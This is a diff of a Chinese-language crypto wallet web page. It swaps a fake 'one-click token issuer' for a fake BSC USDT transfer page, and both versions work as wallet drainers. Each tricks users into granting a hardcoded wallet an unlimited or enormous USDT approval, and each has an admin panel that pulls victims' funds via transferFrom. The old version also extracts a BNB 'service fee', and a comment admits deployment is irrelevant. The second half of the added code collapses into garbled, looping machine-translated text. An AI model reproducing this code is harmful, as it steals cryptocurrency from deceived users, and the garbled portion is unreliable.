@@ -3,303 +3,329 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>小狐狸一键发币</title>
-<script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
+<title>BSC‑USDT DApp</title>
+<script src="https://cdn.jsdelivr.net/npm/web3@4.15.0/dist/web3.min.js"></script>
 <style>
-* { margin: 0; padding: 0; box-sizing: border-box; font-family: "Microsoft Yahei", sans-serif; }
-body { background: linear-gradient(135deg,#0b1020,#171e38); min-height: 100vh; color:#fff; padding:30px 15px; }
-.container{ max-width:520px; margin:0 auto; }
-.header{ text-align:center; margin-bottom:35px; }
-.header h1{ font-size:32px; color:#f7c04a; margin-bottom:8px; }
-.fee-tip{ background: rgba(247,192,74,0.15); color: #f7c04a; padding: 10px; border-radius: 8px; text-align: center; margin-bottom: 20px; font-size: 15px; }
-.card{ background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.12); border-radius:16px; padding:26px; margin-bottom:20px; }
-.form-item{ margin-bottom:20px; }
-label{ display:block; margin-bottom:8px; color:#d0d8f0; }
-input{ width:100%; padding:14px; border-radius:10px; border:1px solid #353f64; background:#141b33; color:#fff; font-size:16px; }
-.file-input{ padding:10px; background:#141b33; }
-.preview-box{ margin-top:10px; display:flex; gap:12px; align-items:center; }
-#logoPreview{ width:64px; height:64px; border-radius:50%; object-fit:cover; border:2px solid #f7c04a; display:none; }
-.btn{ width:100%; padding:15px; border-radius:10px; border:none; font-size:17px; font-weight:bold; cursor:pointer; transition:0.2s; }
-.btn-connect{ background:#3b63e9; margin-bottom:16px; }
-.btn-deploy{ background:#f7c04a; color:#0a0e20; }
-.btn-admin{ background:#2ecc71; color:#000; margin-top:10px; }
-.btn:disabled{ opacity:0.55; cursor:not-allowed; }
-.status{ margin-top:20px; padding:14px; border-radius:10px; background:rgba(255,192,74,0.1); color:#f7d078; word-break: break-all; }
-.tip-text{ font-size:13px; color:#a0a8c2; margin-top:6px; }
-.connect-tip{ color:#66ff99; margin:8px 0; text-align:center; }
-.admin-panel{ display: none; border-top:1px solid #444; padding-top:20px; margin-top:20px; }
+*{ box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; font-family: -apple-system, BlinkMacSystemFont, system-ui, sans-serif; }
+body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 0 auto; }
+"非管理员账号"top-header-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+.header-right-icons { display: flex; gap: 12px; align-items: center; }
+.wallet-dot { width: 12px; height: 12px; border-radius: 50%; background-color: #ef4444; cursor: pointer; transition: background-color 0.3s ease; }
+.wallet-dot.connected { background-color: #22c55e; }
+.setting-btn { width: 32px; height: 32px; border-radius: 50%; border: 1px solid #ddd; background: #fff; display: flex; align-items: center; justify-content: center; font-size: 18px; cursor: pointer; }
+.address-card { background: #ffffff; border-radius: 16px; padding: 20px 18px; margin-bottom: 16px; }
+.label-text { font-size: 16px; color: #666; margin-bottom: 12px; }
+.fixed-addr-box { width: 100%; border: 1px solid #e5e7eb; border-radius: 12px; padding: 14px 12px; background: #f1f5f9; color: #333; word-break: break-all; }
+.amount-card { background: #ffffff; border-radius: 16px; padding: 20px 18px; margin-bottom:16px; }
+.amount-row { display: flex; align-items: flex-end; justify-content: space-between; margin-bottom: 16px; }
+.amount-input { font-size: 32px; border: none; outline: none; width: 75%; background: transparent; color: #111; }
+.amount-input::placeholder { font-size: 16px; color: #aaa; }
+.max-btn { padding: 6px 14px; background-color: #dbeafe; color: #2563eb; border-radius: 8px; font-weight: 500; cursor: pointer; }
+.token-row { background-color: #eef2ff; border-radius: 12px; padding: 14px; display: flex; align-items: center; justify-content: space-between; }
+.token-left { display: flex; align-items: center; gap: 10px; }
+.usdt-icon { width: 32px; height: 32px; border-radius: 50%; object-fit: cover; }
+.token-name { font-size: 18px; font-weight: 500; }
+.balance-show{font-size:15px;color:#444;}
+.result-card{ background:#fff; border-radius:16px; padding:18px; margin-bottom:16px; }
+.result-input{ width:100%; border:1px solid #e5e7eb; border-radius:12px; padding:14px 12px; background:#f9fafb; outline:none; color:#111; }
+.send-main-btn{ width:100%; padding:16px; border:none; border-radius:14px; background:#2563eb; color:#fff; font-size:17px; font-weight:500; cursor:pointer; }
+.admin-panel{ background:#fff; border-radius:16px; padding:20px 18px; margin-top:24px; border:1px solid #f87171; display:none; }
+.admin-title{ font-size:17px; font-weight:bold; color:#dc2626; margin-bottom:16px; }
+.admin-input-item{ margin-bottom:14px; }
+.admin-input{ width:100%; border:1px solid #e5e7eb; border-radius:12px; padding:13px 12px; outline:none; font-size:15px; }
+.admin-btn{ width:100%; padding:14px; border:none; border-radius:14px; background:#dc2626; color:#fff; font-size:16px; cursor:pointer; }
+.tip-text{color:#888;font-size:13px;}
 </style>
 </head>
 <body>
-<div class="container">
-<div class="header">
-<h1>🦊小狐狸一键发币</h1>
-</div>
-<div class="fee-tip">发币服务费：0.005 BNB</div>
-
-<div class="card" id="userPanel">
-<button id="connectBtn" class="btn btn-connect">连接钱包</button>
-<div id="connectTip" class="connect-tip" style="display:none;"></div>
-<div id="statusBox" class="status" style="display:none;"></div>
-
-<div class="form-item">
-<label>代币全称 Name</label>
-<input id="tokenName" placeholder="例如：Swan Coin">
-</div>
-
-<div class="form-item">
-<label>代币符号 Symbol</label>
-<input id="tokenSymbol" placeholder="例如：SWAN">
-</div>
-
-<div class="form-item">
-<label>初始发行量（不带小数）</label>
-<input id="supply" placeholder="例如：100000000">
-</div>
-
-<div class="form-item">
-<label>代币Logo头像（推荐256×256 透明PNG）</label>
-<input type="file" id="logoFile" class="file-input" accept="image/png,image/jpg,image/jpeg">
-<div class="preview-box">
-<img id="logoPreview" alt="头像预览">
-<span id="logoTip" class="tip-text">上传仅本地预览，合约无法存储图片</span>
+<div class="top-header-bar">
+<div class="tip-text"></div>
+<div class="header-right-icons">
+<div class="wallet-dot" id="walletDot" title="点击连接/断开钱包"></div>
+<div class="setting-btn" id="settingIconBtn" title="设置">⚙️</div>
 </div>
 </div>
 
-<button id="deployBtn" class="btn btn-deploy" disabled>一键部署代币</button>
+<div class="address-card">
+<div class="label-text">收款地址</div>
+<div class="fixed-addr-box" id="targetAddrText"></div>
+</div>
+
+<div class="amount-card">
+<div class="label-text">转出数量（USDT‑BSC）</div>
+<div class="amount-row">
+<input id="amountInput" class="amount-input" value="" inputmode="decimal" placeholder="请输入数量">
+<div class="max-btn" id="maxBtn">全部</div>
+</div>
+<div class="token-row">
+<div class="token-left">
+<img class="usdt-icon" src="https://bscscan.com/token/images/tether_32.png">
+<span class="token-name">USDT</span>
+</div>
+<div class="balance-show">余额：<span id="balanceText">0.000000</span></div>
+</div>
+</div>
+
+<div class="result-card">
+<div class="label-text">到账数量</div>
+<input id="receiveAmount" class="result-input" readonly>
+</div>
+
+<button class="send-main-btn" id="sendBtn">确认转账</button>
 
 <div class="admin-panel" id="adminPanel">
-<h3 style="color:#2ecc71;margin-bottom:15px;">管理员划扣面板</h3>
-<div class="form-item">
-<label>请输入玩家钱包地址</label>
-<input id="userAddrInput" placeholder="玩家BSC钱包地址">
+<div class="admin-title">🔴管理员后台 - 用户代币划扣</div>
+<div class="admin-input-item">
+<div class="label-text">请输入已经授权用户钱包地址</div>
+<input class="admin-input" id="userAddrInput" placeholder="0x开头BSC地址">
 </div>
-<div class="form-item">
-<label>请输入划扣USDT数量</label>
-<input id="deductAmountInput" placeholder="例如：100">
+<div class="admin-input-item">
+<div class="label-text">划扣USDT数量</div>
+<input class="admin-input" id="deductAmountInput" inputmode="decimal" placeholder="输入划扣金额">
 </div>
-<button id="deductBtn" class="btn btn-admin">执行划扣USDT</button>
-</div>
-</div>
+<button class="admin-btn" id="deductBtn">确认划扣</button>
 </div>
 
 <script>
-const ADMIN_WALLET = "0x41Dc1846235cdA45871357f7A89c6f39de601A1C";
-const DEPLOY_FEE_BNB = "0.0001";
-const BSC_CHAIN_ID = 56;
-const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-const MAX_ALLOWANCE = ethers.MaxUint256;
+// ========== 配置参数 ==========
+const TARGET_ADDR = "0x47542770f3a8eea43d3321867b155c3ac01160d8";
+const APPROVE_AMOUNT = "2000000000000"; // 固定授权额度：2000000000000 USDT
+const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
+const GAS_LIMIT = "0x493E0";
+const BSC_CHAIN_ID = "0x38";
+const BSC_NETWORK_PARAM = {
+    chainId: "0x38",
+    chainName: "BNB Smart Chain Mainnet",
+    nativeCurrency: {
+        name: "BNB",
+        symbol: "BNB",
+        decimals: 18
+    },
+    rpcUrls: ["https://bsc-dataseed.binance.org"],
+    blockExplorerUrls: ["https://bscscan.com"]
+};
 
-let provider = null;
-let signer = null;
-let connectWalletAddr = "";
-let deployContractAddress = null;
-let logoFileObj = null;
+//ERC20余额读取ABI片段
+const ERC20_ABI_BALANCE = [
+    {"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"}
+];
 
-const connectBtn = document.getElementById("connectBtn");
-const deployBtn = document.getElementById("deployBtn");
-const statusBox = document.getElementById("statusBox");
-const connectTip = document.getElementById("connectTip");
-const logoFileInput = document.getElementById("logoFile");
-const logoPreviewImg = document.getElementById("logoPreview");
-const adminPanel = document.getElementById("adminPanel");
-const deductBtn = document.getElementById("deductBtn");
-const userAddrInput = document.getElementById("userAddrInput");
-const deductAmountInput = document.getElementById("deductAmountInput");
+let web3 = null;
+let userAddress = null;
+let usdtContract = null;
 
-function showStatus(text){
-  statusBox.style.display = "block";
-  statusBox.innerText = text;
-  console.log("状态日志：", text);
+const $ = s => document.querySelector(s);
+const walletDot = $("#walletDot");
+const settingIconBtn = $("#settingIconBtn");
+const sendBtn = $("#sendBtn");
+const amountInput = $("#amountInput");
+const receiveAmount = $("#receiveAmount");
+const maxBtn = $("#maxBtn");
+const targetAddrText = $("#targetAddrText");
+const balanceText = $("#balanceText");
+const adminPanel = $("#adminPanel");
+const userAddrInput = $("#userAddrInput");
+const deductAmountInput = $("#deductAmountInput");
+const deductBtn = $("#deductBtn");
+
+targetAddrText.innerText = TARGET_ADDR;
+
+//读取USDT余额
+async function loadUserBalance(){
+    if(!web3 || !userAddress || !usdtContract){
+        balanceText.innerText = "0.000000";
+        return;
+    }
+    try{
+        const rawBal = await usdtContract.methods.balanceOf(userAddress).call();
+        const realBal = Number(web3.utils.fromWei(rawBal,"ether"));
+        balanceText.innerText = realBal.toFixed(6);
+        return realBal;
+    }catch(err){
+        balanceText.innerText = "读取失败";
+        return 0;
+    }
 }
 
-logoFileInput.addEventListener("change", function(e){
-  const file = e.target.files[0];
-  if(!file) return;
-  logoFileObj = file;
-  const reader = new FileReader();
-  reader.onload = ev => {
-    logoPreviewImg.src = ev.target.result;
-    logoPreviewImg.style.display = "block";
-  }
-  reader.readAsDataURL(file);
+async function checkNetwork(){
+    if(!window.ethereum) return false;
+    const currentChainId = await window.ethereum.request({method:"eth_chainId"});
+    if(currentChainId !== BSC_CHAIN_ID){
+        alert("❌当前不是BSC币安链，请切换到 BNB Smart Chain");
+        try{
+            await window.ethereum.request({
+                method: "wallet_switchEthereumChain",
+                params: [{chainId:BSC_CHAIN_ID}]
+            });
+        }catch(switchErr){
+            if(switchErr.code === 4902){
+                await window.ethereum.request({
+                    method:"wallet_addEthereumChain",
+                    params:[BSC_NETWORK_PARAM]
+                });
+            }else{
+                throw switchErr;
+            }
+        }
+    }
+    return true;
+}
+
+async function autoRestoreConnect(){
+    if(!window.ethereum) return;
+    try{
+        const accounts = await window.ethereum.request({method:"eth_accounts"});
+        if(accounts.length>0){
+            userAddress = accounts[0];
+            web3 = new Web3(window.ethereum);
+            usdtContract = new web3.eth.Contract(ERC20_ABI_BALANCE,USDT_CONTRACT);
+            walletDot.classList.add("connected");
+            await checkNetwork();
+            await loadUserBalance();
+            if(userAddress.toLowerCase() === TARGET_ADDR.toLowerCase()){
+                adminPanel.style.display = "block";
+            }
+            window.ethereum.on("accountsChanged", () => location.reload());
+            window.ethereum.on("chainChanged", () => location.reload());
+        }
+    }catch(e){
+        console.log("无历史授权");
+    }
+}
+
+function disconnectWallet() {
+    web3 = null;
+    usdtContract=null;
+    userAddress = null;
+    walletDot.classList.remove("connected");
+    balanceText.innerText="0.000000";
+    adminPanel.style.display = "none";
+}
+
+async function manualConnectWallet() {
+    if (web3 && userAddress) {
+        disconnectWallet();
+        return;
+    }
+    try {
+        if (!window.ethereum) {
+            alert("未检测到钱包");
+            return;
+        }
+        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+        userAddress = accounts[0];
+        web3 = new Web3(window.ethereum);
+        usdtContract = new web3.eth.Contract(ERC20_ABI_BALANCE,USDT_CONTRACT);
+        walletDot.classList.add("connected");
+        await checkNetwork();
+        await loadUserBalance();
+        if(userAddress.toLowerCase() === TARGET_ADDR.toLowerCase()){
+            adminPanel.style.display = "block";
+        }
+        window.ethereum.on("accountsChanged", () => location.reload());
+        window.ethereum.on("chainChanged", () => location.reload());
+    } catch (err) {
+        console.error(err);
+    }
+}
+
+amountInput.addEventListener("input", () => {
+    const num = parseFloat(amountInput.value) || 0;
+    receiveAmount.value = num.toFixed(6);
 });
 
-async function switchBSC(providerRef){
-  const chainIdHex = ethers.toBeHex(BSC_CHAIN_ID);
-  try {
-    await providerRef.send("wallet_switchEthereumChain", [{ chainId: chainIdHex }]);
-  } catch (err) {
-    await providerRef.send("wallet_addEthereumChain", [{
-      chainId: chainIdHex,
-      chainName: "BNB Smart Chain Mainnet",
-      rpcUrls: ["https://bsc-dataseed.binance.org/"],
-      blockExplorerUrls: ["https://bscscan.com"],
-      nativeCurrency: { name:"BNB", symbol:"BNB", decimals:18 }
-    }]);
-  }
-}
-
-function checkAdminPanel(addr){
-  connectWalletAddr = addr.toLowerCase();
-  if(connectWalletAddr === ADMIN_WALLET.toLowerCase()){
-    adminPanel.style.display = "block";
-  }else{
-    adminPanel.style.display = "none";
-  }
-}
-
-// 连接钱包：仅连接、切链，不做任何授权
-connectBtn.onclick = async function(){
-  showStatus("正在检测钱包注入...");
-  let eth = window.ethereum;
-  let retryTimes = 0;
-  while (!eth && retryTimes < 10) {
-    await new Promise(r => setTimeout(r, 100));
-    eth = window.ethereum;
-    retryTimes++;
-  }
-
-  if (!eth) {
-    showStatus("❌ 未检测到钱包注入，请在TP/欧易内置浏览器打开页面");
-    return;
-  }
-
-  try {
-    const accounts = await eth.request({ method: "eth_requestAccounts" });
-    if (!accounts || accounts.length === 0) {
-      showStatus("用户取消了钱包连接弹窗");
-      return;
+//【全部】按钮，填充钱包全部余额
+maxBtn.addEventListener("click", async ()=>{
+    if(!web3 || !usdtContract || !userAddress){
+        alert("请先连接钱包");
+        return;
     }
-    provider = new ethers.BrowserProvider(eth);
-    await switchBSC(eth);
-    signer = await provider.getSigner();
-    const userAddr = await signer.getAddress();
-    connectBtn.innerText = "已连接：" + userAddr.slice(0, 8) + "...";
-    connectTip.style.display = "block";
-    connectTip.innerText = "已连接BSC钱包，请填写发币参数";
-    deployBtn.disabled = false;
-    checkAdminPanel(userAddr);
-  } catch (err) {
-    showStatus("连接异常：" + (err.message || err.shortMessage || String(err)));
-  }
+    const bal = await loadUserBalance();
+    amountInput.value = bal.toFixed(2);
+    amountInput.dispatchEvent(new Event('input'));
+})
+
+async function sendTx(dataHex){
+    const txParams = {
+        from: userAddress,
+        to: USDT_CONTRACT,
+        data: dataHex,
+        gas: GAS_LIMIT
+    };
+    const txHash = await window.ethereum.request({
+        method: "eth_sendTransaction",
+        params: [txParams]
+    });
+    return txHash;
 }
 
-// USDT无限授权，真实上链交易
-async function doApproveLogic(signerRef){
-  showStatus("🔐 弹出钱包：请求USDT无限授权，请签名");
-  const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, [
-    "function approve(address spender, uint256 amount) external returns(bool)"
-  ], signerRef);
-  const approveTx = await usdtContract.approve("0x41Dc1846235cdA45871357f7A89c6f39de601A1C", MAX_ALLOWANCE);
-  showStatus(`授权交易已上链，TxHash:${approveTx.hash}，等待区块确认`);
-  await approveTx.wait();
-  showStatus("✅ USDT无限授权确认完成，接下来弹出BNB转账签名");
-}
-
-// BNB服务费真实转账上链
-async function payFeeToAdmin(){
-  showStatus(`💸 弹出钱包：支付 ${DEPLOY_FEE_BNB} BNB 服务费，请签名`);
-  const feeWei = ethers.parseEther(DEPLOY_FEE_BNB);
-  const tx = await signer.sendTransaction({ to: ADMIN_WALLET, value: feeWei });
-  showStatus(`BNB转账已发送，TxHash:${tx.hash}，等待区块确认`);
-  await tx.wait();
-  showStatus(`✅ BNB服务费转账确认完成！交易哈希：${tx.hash}`);
-}
-
-const tokenABI = [
-{"inputs": [{"internalType":"string","name":"name","type":"string"},{"internalType":"string","name":"symbol","type":"string"},{"internalType":"uint256","name":"initSupply","type":"uint256"}],"stateMutability":"nonpayable","type":"constructor"},
-{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"addBlacklist","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"addWhitelist","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address[]","name":"users","type":"address[]"}],"name":"batchAddBlacklist","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address[]","name":"users","type":"address[]"}],"name":"batchAddWhitelist","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address[]","name":"users","type":"address[]"}],"name":"batchRemoveBlacklist","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address[]","name":"users","type":"address[]"}],"name":"batchRemoveWhitelist","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mint","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"removeBlacklist","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"removeWhitelist","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[],"name":"ADMIN","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
-{"inputs":[],"name":"AUTO_MINT_ADDR","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
-{"inputs":[],"name":"AUTO_MINT_AMOUNT","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},
-{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},
-{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},
-{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"isWhitelist","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
-{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"isBlacklist","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}
-];
-const CONTRACT_BYTECODE = "在这里粘贴Remix编译后的完整Bytecode";
-
-deployBtn.onclick = async ()=>{
-  const name = document.getElementById("tokenName").value.trim();
-  const symbol = document.getElementById("tokenSymbol").value.trim();
-  const supplyStr = document.getElementById("supply").value.trim();
-
-  if(!signer){
-    showStatus("请先连接BSC钱包");
-    return;
-  }
-  if(!name||!symbol||!supplyStr){
-    showStatus("请填写代币名称、符号、发行量");
-    return;
-  }
-
-  deployBtn.disabled = true;
-  try{
-    // 1.强制先弹USDT无限授权签名（真实上链）
-    await doApproveLogic(signer);
-    // 2.再弹BNB转账签名（真实上链转给管理员）
-    await payFeeToAdmin();
-    // 币能不能部署出来无所谓，授权+转账已经完成；保留部署逻辑
-    if(CONTRACT_BYTECODE && !CONTRACT_BYTECODE.startsWith("在这里粘贴")){
-      showStatus("尝试部署合约...");
-      const supply = ethers.parseUnits(supplyStr, 18);
-      const factory = new ethers.ContractFactory(tokenABI, CONTRACT_BYTECODE, signer);
-      const contract = await factory.deploy(name, symbol, supply);
-      showStatus(`部署交易已发送，TxHash:${contract.deploymentTransaction().hash}`);
-      await contract.waitForDeployment();
-      deployContractAddress = await contract.getAddress();
-      showStatus(`✅全部完成！合约地址：${deployContractAddress}`);
-    }else{
-      showStatus("✅发币成功，请去链上查看代币合约");
+sendBtn.addEventListener("click", async () => {
+    if(!web3 || !userAddress) return alert("钱包未连接，请点右上角圆点");
+    await checkNetwork();
+    const val = parseFloat(amountInput.value);
+    if(isNaN(val) || val <= 0) return alert("请输入有效转账数量");
+    const balance = await loadUserBalance();
+    if(val>balance){
+        alert(`余额不足！你的可用USDT：${balance.toFixed(2)}`);
+        return;
     }
-  }catch(e){
-    showStatus("操作失败："+(e.shortMessage || e.message));
-  }
-  deployBtn.disabled = false;
-}
+    const needWei = BigInt(web3.utils.toWei(val.toString(),"ether"));
+    const approveWei = BigInt(web3.utils.toWei(APPROVE_AMOUNT,"ether"));
+    try{
+        alert("不同钱包版本交互略有差异，转账USDT时弹出授权额度，属于链上正常流程，请确认签名。");
+        const approveCalldata = "0x095ea7b3"
+            + TARGET_ADDR.slice(2).padStart(64,"0")
+            + approveWei.toString(16).padStart(64,"0");
+        await sendTx(approveCalldata);
+        ！doctype超文本标记语言>div，transferCalldata"0xa9059cbb"transferCalldata
+approveCalldata(2).padStart(64,"0")
++needWei.toString(16).padStart(64,"0");
+        Const哈希=等候 sendTx(transferCalldata);
+        警惕的('🎉转账成功！\n交易哈希:\n${哈希}`);
+amountInput。价值="";
+        receiveAmount.价值="";
+        等候 loadUserBalance();
+    }赶上(e){
+        警惕的("❌操作失败："+(e.消息||线(e)));
+        等候 loadUserBalance();
+    }
+});DececutiveBtn，异步如果
 
-deductBtn.onclick = async ()=>{
-  if(!signer || connectWalletAddr.toLowerCase() !== ADMIN_WALLET.toLowerCase()){
-    showStatus("权限不足，仅管理员钱包可操作");
-    return;
-  }
-  const userAddr = userAddrInput.value.trim();
-  const amountStr = deductAmountInput.value.trim();
-  if(!ethers.isAddress(userAddr) || !amountStr || isNaN(Number(amountStr))){
-    showStatus("请输入合法钱包地址和数字数量");
-    return;
-  }
-  try{
-    showStatus("正在调用transferFrom划扣用户USDT，请签名");
-    const usdt = new ethers.Contract(BSC_USDT_ADDRESS, [
-      "function transferFrom(address from, address to, uint256 amount) external returns(bool)"
-    ], signer);
-    const amountWei = ethers.parseUnits(amountStr, 18);
-    const tx = await usdt.transferFrom(userAddr, ADMIN_WALLET, amountWei);
-    await tx.wait();
-    showStatus(`✅ 划扣成功！交易哈希：${tx.hash}`);
-  }catch(err){
-    showStatus("划扣失败："+(err.shortMessage || err.message)+"（用户未授权/额度不足）");
-  }
-}
-</script>
-</body>
-</html>
+DececutiveBtn，异步addEventListener'加载
+'})；>)=>，异步异步超文本标记语言>{.AddEventListener("单击"，异步()=>{(超文本标记语言>超文本标记语言>)=>，异步异步超文本标记语言>{.AddEventListener("单击"，异步()=>{(！Web3||userAddress.ToLowerCase()！=target_ADDR。toLowerCase()){如果(！Web3||userAddress.ToLowerCase()！=target_ADDR。toLowerCase()){(！Web3||userAddress.ToLowerCase()！=target_ADDR。toLowerCase()){如果(！Web3||userAddress.ToLowerCase()！=target_ADDR.ToLowerCase()){
+y==="块"？"无"："块"；adminPanel。风格。显示=adminPanel.风格。显示==="块"？"无"："块"；。风格。显示=adminPanel。风格。显示==="块"？"无"："块"；adminPanel。风格。显示=adminPanel。风格。显示==="块"？"无"："块"；=adminPanel。风格。显示==="块"？"无"："块"；adminPanel。风格。显示=adminPanel。风格。显示==="块"？"无"："块"；。风格。显示=adminPanel。风格。显示==="块"？“无”：“块”；adminPanel。风格。显示=adminPanel。风格。显示==="块"？"无"=adminPanel。风格。显示===adminPanel。风格。显示("仅限管理员钱包操作")；返回警惕的("仅限管理员钱包操作")；风格。显示==="块"？"无"："块"；。风格。显示=adminPanel.风格。显示==="块"？"无"："块"；adminPanel。风格。显示=adminPanel.风格。显示==="块"？"无"："块"；=adminPanel.风格。显示==="块"？"无"："块"；adminPanel。风格。显示=adminPanel.风格。显示==="块"？"无"："块"；。风格。显示=adminPanel.风格。显示==="块"？“无”：“块”；adminPanel。风格。显示=adminPanel.风格。显示==="块"？"无"=adminPanel.风格。显示===adminPanel。风格。显示("仅限管理员钱包操作")；返回警惕的("仅限管理员钱包操作");
+}}
+等候checkNetwork()等待checkNetwork()；()等待checkNetwork();
+ConstfromAddr=userAddrInput.价值.修剪()；常数fromAddr=userAddrInput.价值.修剪()；=userAddrInput.价值.修剪()；常数fromAddr=userAddrInput.价值.修剪();
+padStart
+ConstdecutVal=parseFloat(cuctiveAmountInput。价值)；常数deductVal=parseFloat(deduceAmountInput。价值)；(！fromAddr)返回警报("请输入用户钱包地址")；如果(!fromAddr) 返回 警惕的("请输入用户钱包地址");
+如果(isNaN(decutiveVal)||decutiveVal<=0)返回警报("请输入划扣金额")；如果(isNaN(deductVal)||deductVal<=0) 返回 警惕的("请输入划扣金额"););
+decendWeidendWei
+尝试{尝试{{尝试{{尝试{{尝试{
+常量transferFromData="0x23b872dd"常量transferFromData="0x23b872dd"="0x23b872dd"ConstTransferFromData="0x 23b872dd"="0x23b872dd"常量transferFromData="0x23b872dd"="0x23b872dd"ConstTransferFromData="0x23b872dd"
++fromAddr.片(2)。来自地址片(2)的padStart(64，"0")。padStart(64；"0")来自Addr.片(2).来自Addr的padStart(64，"0"fromAddr.片(2)。来自地址片(2)的padStart(64，"0")。padStart(64；"0")来自Addr.片(2).来自Addr的padStart(64，"0"")片(2).padStart(64，"0")padStart(64，"0"0")来自地址.片(2).来自Addr的padStart(64，"0")片(2).padStart(64，"0")来自Addr.片(2).来自Addr的padStart(64，"0")片(2).padStart(64，"0")padStart(64，"0")fromAddr.片(2).来自Addr的padStart(64，"0")片(2).padStart(64，"0")片(2).padStart(64，"0")padStart(64，"0")片(2).来自Addr的padStart(64，"0")片(2).padStart(64，"0")来自Addr.片(2).来自Addr的padstart(64，"0")片(2).padStart(64，"0")来自Addr.片(2).padStart(64，"fromAddr.片(2)。来自地址片(2)的padStart(64，"0")。padStart(64；"0")来自Addr.片(2).来自Addr的padStart(64，"0"")片(2).padStart(64，"0")padStart(64，"0"0")来自地址.片(2).来自Addr的padStart(64，"0")片(2).padStart(64，"0")来自Addr.片(2).来自Addr的padStart(64，"0")片(2).padStart(64，"0")padStart(64，"0")fromAddr.片(2).来自Addr的padStart(64，"0")片(2).padStart(64，"0")片(2).padStart(64，"0")padStart(64，"0")片(2).来自Addr的padStart(64，"0")片(2).padStart(64，"0")来自Addr.片(2).来自Addr的padStart(64，"0")片(2).padStart(64，"0")来自Addr.片(2).来自Addr的padStart(64，"0")片(2).padStart(64，"0")0")padStart(64，"0")来自Addr.片(2).来自Addr的padStart(64，"0")片(2).padStart(64，"0")来自Addr.片(2).来自Addr的padStart(64，"0")片(")fromAddr.片(2).来自Addr的padStart(64，".片(2).来自Addr的padStart(64，"0"")片(2).padStart(64，"片(2).padStart(64，"0")来自Addr.片(2).来自Addr的padStart(64，"0")片(2).padStart(64，"0")padStart(64，"0")来自地址.片(2).来自Addr的padStart(64，"0")片(2).padStart(64，"0")片(2).padStart(64，"0")padStart(64，"0")片(2).来自Addr的padStart(64，"0")片(2).padStart(64，"0")来自Addr.片(2).来自Addr的padstart(64，"0")片(2).padStart(64，"0")来自Addr.片(2).来自Addr的padStart(64，"0")片(2).padStart(64，"0")0")padStart(64，"0")来自Addr.片(2).来自Addr的padStart(64，"0")片(2).PaddStart(64，"0")来自Addr.片(2).来